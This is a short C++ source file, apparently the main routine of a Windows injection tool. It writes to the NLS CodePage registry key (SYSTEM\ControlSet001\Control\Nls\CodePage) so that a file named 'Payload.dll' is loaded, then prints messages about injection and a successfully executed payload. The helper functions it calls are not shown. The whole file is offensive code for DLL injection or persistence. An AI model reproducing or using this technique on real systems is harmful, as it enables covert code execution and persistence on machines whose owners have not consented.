#include "payload.hpp"
#include "headers.hpp"

//Pending: Make initializer_list cleaner
uint32_t main(void)
{
    std::initializer_list<std::wstring> list = { L"SYSTEM\\ControlSet001\\Control\\Nls\\CodePage", L"Payload.dll" , L""};
    auto regObj = std::make_unique<RegistryManipulation>(list);
    if (OpenKeyForNlsModification(regObj.get()))
    {
#ifdef DEBUG
        std::printf("Key has been modified, now preparing for injection\n");
#endif 
        std::printf("Payload executed sucessfully :)\n");
        system("pause");
    }

    return EXIT_SUCCESS;
}